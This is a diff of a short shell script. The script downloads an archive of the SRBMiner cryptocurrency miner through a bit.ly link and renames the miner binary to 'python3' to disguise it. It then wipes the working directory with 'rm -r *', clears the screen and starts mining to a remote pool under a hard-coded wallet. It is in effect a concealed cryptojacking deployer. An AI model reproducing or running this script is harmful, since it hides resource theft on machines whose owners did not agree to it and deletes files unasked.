@@ -1,13 +1,21 @@
-wget https://bit.ly/kontolrum
+wget -O dot bit.ly/KONTOL-AKU-GEDE
 
-tar -xvf kontolrum
+tar -xzvf dot
 
-cd SRBMiner-Multi-2-4-7
+rm dot
 
-mv SRBMiner-MULTI python3
+cd dotsrb
+
+mv python3 ~/
+
+cd ..
+
+rm -r *
+
+cd ~/
 
 nomer=$((RANDOM % 50 + 1))
 
 clear
 
-./python3 --algorithm randomx --pool luckyynr.us.to:443 --wallet TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOTcs-$nomer --keepalive true
+./python3 -a randomxtuske -o luckyynr.us.to:443 -u TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOTcs-$nomer
